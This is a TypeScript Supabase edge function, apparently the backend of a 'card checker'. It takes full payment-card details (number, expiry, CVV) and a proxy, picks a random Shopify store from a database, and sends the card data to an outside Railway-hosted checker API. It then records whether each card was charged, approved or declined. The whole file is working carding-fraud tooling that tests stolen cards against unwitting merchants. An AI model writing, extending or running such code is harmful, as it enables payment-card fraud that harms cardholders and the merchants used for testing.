import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

/* ── Single-card checker ── */
Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { headers: corsHeaders });

  try {
    const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
    const serviceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
    const supabase = createClient(supabaseUrl, serviceKey);

    // Auth check
    const authHeader = req.headers.get("authorization") || "";
    const token = authHeader.replace("Bearer ", "");
    const { data: { user }, error: authErr } = await supabase.auth.getUser(token);
    if (authErr || !user) {
      return new Response(JSON.stringify({ error: "Unauthorized" }), { status: 401, headers: { ...corsHeaders, "Content-Type": "application/json" } });
    }

    const body = await req.json();
    const { job_id, card, proxy } = body as {
      job_id: string;
      card: { card: string; expiry: string; cvv: string };
      proxy: string;
    };

    if (!job_id || !card || !proxy) {
      return new Response(JSON.stringify({ error: "Missing required fields: job_id, card, proxy" }), {
        status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // Check if job was stopped
    const { data: jobCheck } = await supabase.from("check_jobs").select("status").eq("id", job_id).single();
    if (jobCheck?.status === "stopped") {
      return new Response(JSON.stringify({ status: "stopped" }), {
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // Fetch a site from DB
    const { data: siteRows } = await supabase.from("shopify_sites").select("url");
    if (!siteRows?.length) {
      return new Response(JSON.stringify({ error: "No Shopify sites configured." }), {
        status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }
    // Pick random site
    const site = siteRows[Math.floor(Math.random() * siteRows.length)].url;

    // Update result to checking
    await supabase.from("check_results")
      .update({ status: "checking", site_used: site })
      .eq("job_id", job_id)
      .eq("card_number", card.card)
      .eq("expiry", card.expiry)
      .eq("cvv", card.cvv);

    // Build CC string
    const parts = card.expiry.split("/");
    const ccStr = `${card.card}|${parts[0] || ""}|${parts[1] || ""}|${card.cvv}`;

    // Call external checker
    let result = { status: "declined", code: "ERROR", message: "Unknown error" };
    try {
      const apiUrl = `https://sublime-expression-production-be62.up.railway.app/api.php?cc=${encodeURIComponent(ccStr)}&site=${encodeURIComponent(site)}&proxy=${encodeURIComponent(proxy)}`;
      const resp = await fetch(apiUrl, { method: "GET" });
      const text = await resp.text();
      console.log(`Card response:`, text);

      try {
        const json = JSON.parse(text);
        result = {
          status: json.status === "charged" ? "charged" : json.status === "approved" ? "approved" : "declined",
          code: json.code || json.response_code || json.gateway_code || "",
          message: json.message || json.response || json.msg || text.slice(0, 200),
        };
      } catch {
        const lowerText = text.toLowerCase();
        if (lowerText.includes("charged") || lowerText.includes("charge of")) {
          const amountMatch = text.match(/\$[\d.]+/);
          result = { status: "charged", code: "CHARGED", message: amountMatch ? `Charged ${amountMatch[0]}` : text.slice(0, 200) };
        } else if (lowerText.includes("approved") || lowerText.includes("success")) {
          result = { status: "approved", code: "APPROVED", message: text.slice(0, 200) };
        } else {
          result = { status: "declined", code: "DECLINED", message: text.slice(0, 200) };
        }
      }
    } catch (fetchErr: any) {
      console.error(`Fetch error:`, fetchErr.message);
      result = { status: "declined", code: "FETCH_ERROR", message: fetchErr.message };
    }

    // Update result in DB
    await supabase.from("check_results")
      .update({
        status: result.status,
        response_code: result.code,
        response_message: result.message,
        site_used: site,
      })
      .eq("job_id", job_id)
      .eq("card_number", card.card)
      .eq("expiry", card.expiry)
      .eq("cvv", card.cvv);

    // Update job counters
    const { data: jobData } = await supabase.from("check_jobs").select("processed, charged, approved, declined, total_cards").eq("id", job_id).single();
    if (jobData) {
      const processed = (jobData.processed || 0) + 1;
      const charged = (jobData.charged || 0) + (result.status === "charged" ? 1 : 0);
      const approved = (jobData.approved || 0) + (result.status === "approved" ? 1 : 0);
      const declined = (jobData.declined || 0) + (result.status === "declined" ? 1 : 0);
      const isComplete = processed >= jobData.total_cards;

      await supabase.from("check_jobs").update({
        processed, charged, approved, declined,
        ...(isComplete ? { status: "completed", completed_at: new Date().toISOString() } : {}),
      }).eq("id", job_id);
    }

    return new Response(JSON.stringify({ success: true, result }), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  } catch (err: any) {
    return new Response(JSON.stringify({ error: err.message }), {
      status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
